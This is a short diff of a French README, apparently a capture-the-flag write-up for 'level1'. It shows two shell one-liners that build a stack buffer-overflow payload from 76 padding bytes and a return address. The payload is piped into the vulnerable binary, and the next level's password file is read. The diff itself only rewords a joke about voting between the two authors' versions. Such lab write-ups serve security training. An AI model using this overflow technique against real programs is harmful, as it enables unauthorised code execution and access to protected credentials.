@@ -14,7 +14,9 @@ Nous avons deux codes differents: lvasseur prefere
   - printf "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x44\x84\x04\x08" > /tmp/exploit
 Et lomeress:
   - n=76; for i in $(seq $n); do printf "a"; done > /tmp/slut && printf "\x44\x84\x04\x08" >> /tmp/slut
-votez pour celui que vous prefêrez
+
+Votez pour celui que vous prefêrez: celui qui a le moins de vote paie un jap a volonté à l'autre!
+
 - cat /tmp/exploit - | ./level1
 - appuyer sur entré
 - cat /home/user/level2/.pass
